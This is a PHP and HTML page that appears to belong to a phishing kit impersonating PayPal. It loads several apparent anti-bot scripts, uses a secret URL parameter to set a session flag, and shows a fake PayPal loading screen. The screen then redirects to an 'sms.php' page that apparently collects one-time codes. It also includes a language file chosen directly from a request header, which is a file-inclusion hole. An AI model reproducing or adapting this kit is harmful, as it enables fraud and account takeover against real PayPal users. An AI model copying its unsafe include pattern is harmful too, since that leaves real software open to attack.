<?php
session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

include("X_911.php");

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";


if(isset($_GET["pp"]) && $_GET["pp"] == "2300"){
session_start();
$_SESSION["good"] = "okito";
header("location:wait");
}
?>

	<!doctype html>

<meta http-equiv="refresh" content="27;url=sms.php">
<html>
<head>







</head>
<body>
<style>

html, body { height: 100%; }

body {
display: flex;
align-items: center;
justify-content: center;
}





.loader {
border: 16px solid #f3f3f3; /* Light grey */
border-top: 16px solid #003087; /* Blue */
border-radius: 50%;
width: 120px;
height: 120px;
animation: spin 2s linear infinite;
}

@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}




</style>

<!DOCTYPE html>
<html lang="en"
<head>
<meta charset="utf-8" />
<title>Load</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="application-name" content="PayPal" />
<link rel="shortcut icon" href="./img/pp_favicon_x.ico" />
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
<link rel="stylesheet" href="contextualLoginElementalUI.css">
</head>
</div>
</section>
<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
<div class=" corral">
<div id="content" class="contentContainer activeContent contentContainerBordered">
<header>
<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
</header>
<center>
<style>
.textstyle {
color: #0c0c0d;
font-family: PayPalSansBig-Regular,Helvetica Neue,Arial,sans-serif;
font-size: 1.125rem;
line-height: 1.5rem;
font-weight: 400;
}
form > div {
margin:40px 0
}

/*Start Styling Toggle-Switch*/
.toggle-switch input{
opacity: 0
}

.toggle-switch label{
width: 60px;
height: 30px;
background: #ccc;
border-radius:50px;
display: inline-block;
position: relative;
}

.toggle-switch label:after {
content: '';
display: block;
width: 28px;
height: 28px;
background: #fff;
border-radius: 50%;
position: absolute;
top: 1px;
left: 1px;
transition: left .3s ease-out;
}

.toggle-switch input[id="togle-swith"]:checked + label:after {
left: 31px
}

.toggle-switch input[id="togle-swith"]:checked + label {
background:#3497db;
}
/*End Styling Toggle-Switch*/

/*Start Styling Checkbox*/
.checkbox input{
opacity: 0
}

.checkbox label{
width: 30px;
height: 30px;
background: ;
display: inline-block;
position: relative;
background: #eee
}

.checkbox label:hover{
cursor: pointer
}

.checkbox label:after{
content: '';
display: block;
width: 5px;
height: 10px;
border: 3px solid #fff;
border-top: transparent;
border-left: transparent;
position: absolute;
transform: rotate(45deg) scale(1.3);
top: 6px;
left: 10px;
opacity: 0;
transition:opacity .3s ease-in-out
}

.checkbox input[id="checkbox"]:checked + label:after {
opacity: 1
}

.checkbox input[id="checkbox"]:checked + label {
background:#00d49b
}
/*End Styling Checkbox*/


/*Start Styling Radio Button*/
.radio-btn input{
opacity: 0
}

.radio-btn label{
width: 28px;
height: 28px;
display: inline-block;
position: relative;
border-radius: 50%;
border: 9px solid #ccc
}

.radio-btn label:hover{
cursor: pointer
}

.radio-btn label:after{
content: '';
display: block;
width: 10px;
height: 10px;
position: absolute;
background: #FFF;
border-radius: 50%;
opacity: 0;
top: 50%;
left: 50%;
transform: translate(-50% , -50%);
}

.radio-btn input[type="radio"]:checked + label:after {
opacity: 1;
animation:centring .3s ease-in-out 1 forwards
}

.radio-btn input[type="radio"]:checked + label {
border-color: #1040C1;

}



@keyframes centring {
0% {
top: 50%;
left: 50%;
transform: translate(-50% , -50%);
}

50%{
top: 50%;
left: 50%;
transform: translate(-50% , -50%) scale(2.3);
}
100%{
top: 50%;
left: 50%;
transform: translate(-50% , -50%) scale(1.5);
}


}

/*End Styling Radio Button*/
.column {
float: left;
width: 50%;
}

/* Clear floats after the columns */
.row:after {
content: "";
display: table;
clear: both;
}
</style>
<h1><?php echo $lg_cm['astop19']?></h1><br><br> <br>
<div class="loader"></div>


</p>
<br>
<div>

<style>
.container {
display: flex;
flex-direction: row;
align-items: center;
justify-content: space-between;
width: 267px;
margin: auto;
}
.text {
text-align: right;
flex: 5;
}
.radio {
margin-right: 10px;
}
</style>
<form action="sms.php">




<p class="textstyle" ><?php echo $lg_cm['astop20']?>
</p>








<div class="actions">
</div>
</form>
<footer class="footer footerStayPut" role="contentinfo">
<div class="legalFooter"><ul class="footerGroup">
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top6']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top7']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top8']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top9']?></a>
</li>
</ul>
</div>
</footer>
</div>
</body>
</html>